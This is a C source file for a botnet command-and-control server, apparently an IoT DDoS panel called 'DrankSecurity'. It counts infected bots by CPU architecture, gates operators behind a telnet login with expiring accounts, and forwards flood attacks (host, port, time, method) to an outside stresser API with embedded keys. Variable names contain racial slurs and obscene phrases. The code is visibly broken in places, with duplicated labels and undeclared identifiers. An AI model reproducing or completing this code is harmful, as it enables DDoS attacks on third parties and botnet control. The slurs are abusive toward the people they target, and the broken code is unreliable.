#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <stdint.h>
#include <inttypes.h>
#include <arpa/inet.h>

#define MAXFDS 1000000
#define RED     "\x1b[0;1;30m"
#define Cyan    "\x1b[0;35m"
#define C_RESET "\x1b[0m"

char *colorCodes[] = {"1;34m", "0;0;35m", "1;34m", "0;0;35m", "1;34m", "0;0;35m"};
#define LOGINTRIGGER "login"

c
//--Fearles ServerRoom--
int junkssent = 0;
int rawssent = 0;
int nfossent = 0;
int ovhssent = 0;
int tcpssent = 0;
int vsessent = 0;
int stompssent = 0;
int udpssent = 0;
int ripssent = 0;
int gamessent = 0;
int clapssent = 0;
int hexssent = 0;
int kissssent = 0;
int randhexssent = 0;
int myexits = 0;
int logintrigger = 1;
//-----------------------------------------

struct account {
	char username[100];
	char password[100];
	char admin[50];
	char expirydate[200];
};
static struct account accounts[25];

struct clientdata_t {
        uint32_t ip;
        char x86;
	char ARM;
	char mips;
	char mpsl;
	char ppc;
	char spc;
	char unknown;
        char build[7];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
} managements[MAXFDS];

////////////////////////////////////

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int DUPESDELETED = 0;

////////////////////////////////////


FILE *LogFile2;
FILE *LogFile3;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}

static int check_expiry(const int fd)
{
	time_t t = time(0);
	struct tm tm = *localtime(&t);
	int day, month, year, argc = 0;
	day = tm.tm_mday;
	month = tm.tm_mon + 1;
	year = tm.tm_year - 100;
	char *expirydate = calloc(strlen(accounts[fd].expirydate), sizeof(char));
    strcpy(expirydate, accounts[fd].expirydate);

    char *args[10 + 1];
    char *p2 = strtok(expirydate, "/");

        while(p2 && argc < 10) 
    {
        args[argc++] = p2;
        p2 = strtok(0, "/"); 
    }

    if(year > atoi(args[2]) || day > atoi(args[1]) && month >= atoi(args[0]) && year == atoi(args[2]) || month > atoi(args[0]) && year >= atoi(args[2]))
        return 1;
    return 0; 
}


void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
int resolvehttp(char *  , char *);
int resolvehttp(char * site , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
    if ( (he = gethostbyname( site ) ) == NULL)
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;
    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
    return 1;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
int apicall(char *type, char *ip, char *port, char *method, char *time)
{
    int Sock = -1;
    char request[1024];
    char host_ipv4[20];
    struct sockaddr_in s;
    struct timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 3;
    Sock = socket(AF_INET, SOCK_STREAM, 0);
    s.sin_family = AF_INET;
    s.sin_port = htons(80);
    resolvehttp(apiip, host_ipv4);
    s.sin_addr.s_addr = inet_addr(host_ipv4);
    if(strstr(type, "spoofed"))
 {//https://securityteamapi.io/api.php?ip=%s&port=%s&time=%s&method=%s&vip=NO&user=BlazingOVH1&key=blazing
       		snprintf(request, sizeof(request), "GET /API/bypas1.php?key=secuddrankkkkk&host=%s&port=%s&time=%s&method=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36\r\nConnection: close\r\n\r\n", ip, port, method, time, apiip);
    }///api.php?user=blazingOVH1&key=blazing1&host=%s&port=%s&method=%s&time=%s
    if(connect(Sock, (struct sockaddr *)&s, sizeof(s)) == -1)
    return;
    else
    {
        send(Sock, request, strlen(request), 0);
        char ch;
        int ret = 0;
        uint32_t header_parser = 0;
        while (header_parser != 0x0D0A0D0A)
        {
            if ((ret = read(Sock, &ch, 1)) != 1)
                break;
            header_parser = (header_parser << 8) | ch;
        }
        ret = 0;
        char buf[512];
        while(ret = read(Sock, buf, sizeof(buf)-1))
        {
            buf[ret] = '\0';
            if(strlen(buf) > 0)
            {
                if(strstr(buf, "Failed to connect"))
                {
                    close(Sock);
                    memset(buf, 0, sizeof(buf));
                    return 1;
                }
            }
        }
        close(Sock);
        memset(buf, 0, sizeof(buf));
    }
    return 0;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {                     
                        send(i, "\x1b[1;30mID:", 8, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, " ", 1, MSG_NOSIGNAL);
                        send(i, timestamp, strlen(timestamp), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[0m~\x1b[1;0;35m> \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].ARM = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].spc = 0;
                clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}

					if (dup)
					{
						DUPESDELETED++;
						continue;
					}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
		        client->x86 = 0;
		        client->ARM = 0;
		        client->mips = 0;
		        client->mpsl = 0;
		        client->ppc = 0;
		        client->spc = 0;
		        client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}

										        if(strstr(buf, "x86_64") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "x86_32") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "ARM4") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM5") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM6") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "MIPS") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "MPSL") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "PPC") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "SPC") == buf)
												{
													client->spc = 1;
												}					
												if(strstr(buf, "idk") == buf)
												{
													client->unknown = 1;
												}					
																							
						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf(" \"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
		            client->x86 = 0;
		            client->ARM = 0;
		            client->mips = 0;
		            client->mpsl = 0;
		            client->ppc = 0;
		            client->spc = 0;
		            client->unknown = 0;
				  	close(thefd);
				}
			}
		}
	}
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ARM) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}
unsigned int mpslConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }
 
        return total;
}
unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}
unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
}
unsigned int unknownConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unknown) continue;
                total++;
        }
 
        return total;
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("fearless.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("monitor.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *telnetWorker(void *sock) { 
        int thefd = (int)sock;
        managesConnected++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
        char* admin;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("fearless.txt", "r");
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) {
		fscanf(fp, "%s %s %s %s", accounts[j].username, accounts[j].password);
		++j;
		}
        sprintf(botnet, "\x1b[36m♆ WelCome To DrankSecurity ♆\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
        sprintf(botnet, "\x1b[94mUserName\x1b[92m:\x1b[92m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);

        if(strcmp(nickstring, accounts[find_line].id) == 0){                  
        sprintf(botnet, "\x1b[94mPassWord\x1b[92m:\x1b[30m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:

        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        char failed_line1[100];
        char failed_line2[100];
        char failed_line3[100];
        char failed_line4[100];
        char failed_line5[100];
        char failed_line6[100];
        char failed_line7[100];
        char failed_line8[100];
        char failed_line9[100];
        char failed_line10[100];
        char failed_line11[100];
        char failed_line12[100];

        sprintf(failed_line1, "\x1b[1;1;30m              _________                   _______  \r\n");
        sprintf(failed_line2, "\x1b[1;1;30m    _-----____/   ========================|______| \r\n");
        sprintf(failed_line3, "\x1b[1;1;30m    |           ______________/                    \r\n");
        sprintf(failed_line4, "\x1b[1;1;30m    |    ___--_/(_)       ^                        \r\n");
        sprintf(failed_line5, "\x1b[1;1;30m    |___ ---                                       \r\n");
        sprintf(failed_line6, "\x1b[1;92mI'M GONNA GIVE YOU TO THE COUNT OF TEN TO GET YOUR, UGLY\r\n");
        sprintf(failed_line7, "\x1b[1;1;30mYELLA, NO GOOD KEESTER OFF MY PROPERTY, BEFORE I PUMP\r\n");
        sprintf(failed_line8, "\x1b[1;93mYOUR GUTS FULL'A LEAD...\r\n");
        sprintf(failed_line9, "\x1b[1;92mONE ...\r\n");
        sprintf(failed_line10,"\x1b[1;93mTWO ...\r\n");
        sprintf(failed_line11,"\x1b[1;1;30mTEN ...\r\n");
        sprintf(failed_line12,"\x1b[1;0;35mKEEP THE CHANGE YAH FILTHY ANIMAL.\r\n");
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line3, strlen(failed_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line4, strlen(failed_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line5, strlen(failed_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line6, strlen(failed_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line7, strlen(failed_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line8, strlen(failed_line8), MSG_NOSIGNAL) == -1) goto end;
        sleep(3);
        if(send(thefd, failed_line9, strlen(failed_line9), MSG_NOSIGNAL) == -1) goto end;
        sleep(2);
        if(send(thefd, failed_line10, strlen(failed_line10), MSG_NOSIGNAL) == -1) goto end;
        sleep(2);
        if(send(thefd, failed_line11, strlen(failed_line11), MSG_NOSIGNAL) == -1) goto end;
        sleep(2);
        if(send(thefd, failed_line12, strlen(failed_line12), MSG_NOSIGNAL) == -1) goto end;
        sleep(2);
       FILE *iplog;
            iplog = fopen("fail-Logins.txt", "a");
			time_t now1;
			struct tm *gmt1;
			char formatted_gmt1 [50];
			now1 = time(NULL);
			gmt1 = gmtime(&now1);
			strftime ( formatted_gmt1, sizeof(formatted_gmt1), "%I:%M %p", gmt1 );
            fprintf(iplog, "[%s]: Fail: %s |\n", formatted_gmt1, ipinfo);
            fclose(iplog);
        goto end;
       
        fak:
        pthread_create(&title, NULL, &titleWriter, sock);   
        char lamolamoniggia1   [5000];
		char lamolamoniggia2   [5000];
		char lamolamoniggia3   [5000];
		char lamolamoniggia4   [5000];
		char lamolamoniggia5   [5000];
		char lamolamoniggia6   [5000];
		char lamolamoniggia7   [5000];
		char lamolamoniggia8   [5000];
		char lamolamoniggia9   [5000];
		char lamolamoniggia10  [5000];
		char lamolamoniggia11  [5000];
		char lamolamoniggia12  [5000];
		char lamolamoniggia13  [5000];
		char lamolamoniggia14  [5000];
		char lamolamoniggia15  [5000];
		char lamolamoniggia16  [5000];
		
  sprintf(lamolamoniggia1,   "\e[1;34m         ____,                \r\n");
  sprintf(lamolamoniggia2,   "\e[1;34m        /.---|                \r\n");
  sprintf(lamolamoniggia3,   "\e[1;34m        `    |     ___                \r\n");
  sprintf(lamolamoniggia4,   "\e[1;34m            (=\\!*  /-!* \\                \r\n");
  sprintf(lamolamoniggia5,   "\e[1;34m             |\\/\\_| |  |                \r\n");
  sprintf(lamolamoniggia6,   "\e[1;34m             |_\\ |;-|  ;                \r\n");
  sprintf(lamolamoniggia7,   "\e[1;34m             | / \\| |_/ \\                \r\n");
  sprintf(lamolamoniggia8,   "\e[1;34m             | )/\\/      \\                \r\n");
  sprintf(lamolamoniggia9,   "\e[1;34m             | ( '|  \\   |                \r\n");
  sprintf(lamolamoniggia10,  "\e[1;34m             |    \\_ /   \\                \r\n");
  sprintf(lamolamoniggia11,  "\e[1;34m             |    /  \\_.--\\                \r\n");
  sprintf(lamolamoniggia12,  "\e[1;34m             \\    |    (|\\`                \r\n");
  sprintf(lamolamoniggia13,  "\e[1;34m              |   |     \\                \r\n");
  sprintf(lamolamoniggia14,  "\e[1;34m              |   |      '!*                \r\n");
  sprintf(lamolamoniggia15,  "\e[1;34m              |  /         \\                \r\n");
  sprintf(lamolamoniggia16,  "\e[1;34m              \\  \\.__.__.-._)                \r\n");

 		if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
  		if(send(thefd, lamolamoniggia1, strlen(lamolamoniggia1), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia2, strlen(lamolamoniggia2), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia3, strlen(lamolamoniggia3), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia4, strlen(lamolamoniggia4), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia5, strlen(lamolamoniggia5), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia6, strlen(lamolamoniggia6), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia7, strlen(lamolamoniggia7), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia8, strlen(lamolamoniggia8), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia9, strlen(lamolamoniggia9), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, lamolamoniggia10, strlen(lamolamoniggia10), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia11, strlen(lamolamoniggia11), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia12, strlen(lamolamoniggia12), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia13, strlen(lamolamoniggia13), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia14, strlen(lamolamoniggia14), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia15, strlen(lamolamoniggia15), MSG_NOSIGNAL) == -1) goto end;
  		if(send(thefd, lamolamoniggia16, strlen(lamolamoniggia16), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
 
 		char bitchniggasnitchniggahoe1   [5000];
		char bitchniggasnitchniggahoe2   [5000];
		char bitchniggasnitchniggahoe3   [5000];
		char bitchniggasnitchniggahoe4   [5000];
		char bitchniggasnitchniggahoe5   [5000];
		char bitchniggasnitchniggahoe6   [5000];
		char bitchniggasnitchniggahoe7   [5000];
		char bitchniggasnitchniggahoe8   [5000];
		char bitchniggasnitchniggahoe9   [5000];
		char bitchniggasnitchniggahoe10  [5000];
		char bitchniggasnitchniggahoe11  [5000];
		char bitchniggasnitchniggahoe12  [5000];
		char bitchniggasnitchniggahoe13  [5000];
		char bitchniggasnitchniggahoe14  [5000];
		char bitchniggasnitchniggahoe15  [5000];
		char bitchniggasnitchniggahoe16  [5000];
		
  sprintf(bitchniggasnitchniggahoe1,   "\e[0;35m                      ,____               \r\n");
  sprintf(bitchniggasnitchniggahoe2,   "\e[0;35m                       |---.\\               \r\n");
  sprintf(bitchniggasnitchniggahoe3,   "\e[0;35m               ___     |    `               \r\n");
  sprintf(bitchniggasnitchniggahoe4,   "\e[0;35m              / .-\\  ./=)               \r\n");
  sprintf(bitchniggasnitchniggahoe5,   "\e[0;35m             |  | |_/\\/|               \r\n");
  sprintf(bitchniggasnitchniggahoe6,   "\e[0;35m             ;  |-;| /_|               \r\n");
  sprintf(bitchniggasnitchniggahoe7,   "\e[0;35m            / \\_| |/ \\ |               \r\n");
  sprintf(bitchniggasnitchniggahoe8,   "\e[0;35m           /      \\/\\( |               \r\n");
  sprintf(bitchniggasnitchniggahoe9,   "\e[0;35m           |   /  |` ) |               \r\n");
  sprintf(bitchniggasnitchniggahoe10,  "\e[0;35m           /   \\ _/    |               \r\n");
  sprintf(bitchniggasnitchniggahoe11,  "\e[0;35m          /--._/  \\    |               \r\n");
  sprintf(bitchniggasnitchniggahoe12,  "\e[0;35m          `/|)    |    /               \r\n");
  sprintf(bitchniggasnitchniggahoe13,  "\e[0;35m            /     |   |               \r\n");
  sprintf(bitchniggasnitchniggahoe14,  "\e[0;35m          .'      |   |               \r\n");
  sprintf(bitchniggasnitchniggahoe15,  "\e[0;35m         /         \\  |               \r\n");
  sprintf(bitchniggasnitchniggahoe16,  "\e[0;35m        (_.-.__.__./  /               \r\n");

		if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
		if(send(thefd, bitchniggasnitchniggahoe1, strlen(bitchniggasnitchniggahoe1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe2, strlen(bitchniggasnitchniggahoe2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe3, strlen(bitchniggasnitchniggahoe3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe4, strlen(bitchniggasnitchniggahoe4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe5, strlen(bitchniggasnitchniggahoe5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe6, strlen(bitchniggasnitchniggahoe6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe7, strlen(bitchniggasnitchniggahoe7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe8, strlen(bitchniggasnitchniggahoe8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe9, strlen(bitchniggasnitchniggahoe9), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe10, strlen(bitchniggasnitchniggahoe10), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe11, strlen(bitchniggasnitchniggahoe11), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe12, strlen(bitchniggasnitchniggahoe12), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe13, strlen(bitchniggasnitchniggahoe13), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe14, strlen(bitchniggasnitchniggahoe14), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe15, strlen(bitchniggasnitchniggahoe15), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, bitchniggasnitchniggahoe16, strlen(bitchniggasnitchniggahoe16), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
 
  		char elephantpenisstuckinakitten1   [5000];
		char elephantpenisstuckinakitten2   [5000];
		char elephantpenisstuckinakitten3   [5000];
		char elephantpenisstuckinakitten4   [5000];
		char elephantpenisstuckinakitten5   [5000];
		char elephantpenisstuckinakitten6   [5000];
		char elephantpenisstuckinakitten7   [5000];
		char elephantpenisstuckinakitten8   [5000];
		char elephantpenisstuckinakitten9   [5000];
		char elephantpenisstuckinakitten10   [5000];
		char elephantpenisstuckinakitten11   [5000];
		char elephantpenisstuckinakitten12   [5000];
		char elephantpenisstuckinakitten13   [5000];
		char elephantpenisstuckinakitten14   [5000];
		char elephantpenisstuckinakitten15   [5000];
		char elephantpenisstuckinakitten16   [5000];
		
  sprintf(elephantpenisstuckinakitten1,   "\e[38;5;93m         ____,                     \r\n");
  sprintf(elephantpenisstuckinakitten2,   "\e[38;5;93m        /.---|                     \r\n");
  sprintf(elephantpenisstuckinakitten3,   "\e[38;5;93m        `    |     ___             \r\n");
  sprintf(elephantpenisstuckinakitten4,   "\e[38;5;93m            (=\\!*  /-!* \\          \r\n");
  sprintf(elephantpenisstuckinakitten5,   "\e[38;5;93m             |\\/\\_| |  |         \r\n");
  sprintf(elephantpenisstuckinakitten6,   "\e[38;5;93m             |_\\ |;-|  ;          \r\n");
  sprintf(elephantpenisstuckinakitten7,   "\e[38;5;93m             | / \\| |_/ \\        \r\n");
  sprintf(elephantpenisstuckinakitten8,   "\e[38;5;93m             | )/\\/      \\       \r\n");
  sprintf(elephantpenisstuckinakitten9,   "\e[38;5;93m             | ( '|  \\   |        \r\n");
  sprintf(elephantpenisstuckinakitten10,  "\e[38;5;93m             |    \\_ /   \\       \r\n");
  sprintf(elephantpenisstuckinakitten11,  "\e[38;5;93m             |    /  \\_.--\\      \r\n");
  sprintf(elephantpenisstuckinakitten12,  "\e[38;5;93m             \\    |    (|\\`      \r\n");
  sprintf(elephantpenisstuckinakitten13,  "\e[38;5;93m              |   |     \\         \r\n");
  sprintf(elephantpenisstuckinakitten14,  "\e[38;5;93m              |   |      '!*        \r\n");
  sprintf(elephantpenisstuckinakitten15,  "\e[38;5;93m              |  /         \\      \r\n");
  sprintf(elephantpenisstuckinakitten16,  "\e[38;5;93m              \\  \\.__.__.-._)     \r\n");

		if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) return;
		if(send(thefd, elephantpenisstuckinakitten1, strlen(elephantpenisstuckinakitten1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten2, strlen(elephantpenisstuckinakitten2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten3, strlen(elephantpenisstuckinakitten3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten4, strlen(elephantpenisstuckinakitten4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, elephantpenisstuckinakitten5, strlen(elephantpenisstuckinakitten5), MSG_NOSIGNAL) == -1) goto end;
